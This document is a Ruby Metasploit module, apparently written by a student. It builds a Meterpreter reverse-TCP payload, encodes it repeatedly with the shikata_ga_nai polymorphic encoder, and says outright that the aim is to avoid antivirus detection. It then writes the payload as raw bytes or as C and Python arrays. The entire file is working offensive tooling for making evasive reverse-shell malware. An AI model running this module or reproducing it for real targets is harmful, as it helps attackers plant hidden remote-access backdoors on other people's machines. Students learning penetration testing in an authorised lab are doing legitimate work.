##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Payload Generator with Encoding',
      'Description'    => %q{
        This module generates a custom payload with encoding
        to help avoid antivirus detection. Uses shikata_ga_nai
        polymorphic encoder by default.
      },
      'Author'         => ['Holberton Student'],
      'License'        => MSF_LICENSE
    ))

    register_options([
      OptString.new('PAYLOAD', [true, 'Payload to generate', 'windows/meterpreter/reverse_tcp']),
      OptString.new('LHOST', [true, 'Local IP for reverse connection']),
      OptInt.new('LPORT', [true, 'Local port for reverse connection', 4444]),
      OptString.new('ENCODER', [true, 'Encoder to use', 'x86/shikata_ga_nai']),
      OptInt.new('ITERATIONS', [true, 'Number of encoding iterations', 5]),
      OptString.new('FORMAT', [true, 'Output format (raw, exe, elf, c, python)', 'raw']),
      OptString.new('OUTFILE', [false, 'Output file path'])
    ])
  end

  def run
    payload_name = datastore['PAYLOAD']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    encoder_name = datastore['ENCODER']
    iterations = datastore['ITERATIONS']
    output_format = datastore['FORMAT']
    outfile = datastore['OUTFILE']

    print_status("Generating payload with encoding: #{encoder_name}")

    payload = framework.payloads.create(payload_name)

    if payload.nil?
      print_error("Failed to create payload: #{payload_name}")
      return
    end

    payload.datastore['LHOST'] = lhost
    payload.datastore['LPORT'] = lport

    raw_payload = payload.generate

    if raw_payload.nil? or raw_payload.empty?
      print_error("Failed to generate raw payload")
      return
    end

    print_status("Raw payload size: #{raw_payload.length} bytes")

    encoder = framework.encoders.create(encoder_name)

    if encoder.nil?
      print_error("Failed to create encoder: #{encoder_name}")
      return
    end

    encoded_payload = raw_payload

    iterations.times do |i|
      encoded_payload = encoder.encode(encoded_payload, nil, nil, platform: payload.platform)
    end

    print_status("Encoded payload size: #{encoded_payload.length} bytes")
    print_status("Encoding iterations: #{iterations}")

    case output_format.downcase
    when 'c'
      formatted = to_c_array(encoded_payload)
    when 'python'
      formatted = to_python(encoded_payload)
    when 'hex'
      formatted = encoded_payload.unpack('H*').first
    else
      formatted = encoded_payload.unpack('C*').map { |b| "\\x%02x" % b }.join
    end

    print_good("Generated encoded payload: #{formatted[0, 50]}...")

    if outfile and not outfile.empty?
      begin
        File.open(outfile, 'wb') do |f|
          f.write(encoded_payload)
        end
        print_good("Payload written to: #{outfile}")
      rescue ::Exception => e
        print_error("Failed to write file: #{e.message}")
      end
    end

    print_status("Payload generation completed")
  end

  def to_c_array(data)
    result = "unsigned char payload[] = {\n"
    data.bytes.each_slice(16) do |slice|
      result += "  " + slice.map { |b| "0x%02x" % b }.join(', ') + ",\n"
    end
    result += "};"
    result
  end

  def to_python(data)
    result = "payload = b\""
    result += data.bytes.map { |b| "\\x%02x" % b }.join
    result += "\""
    result
  end
end
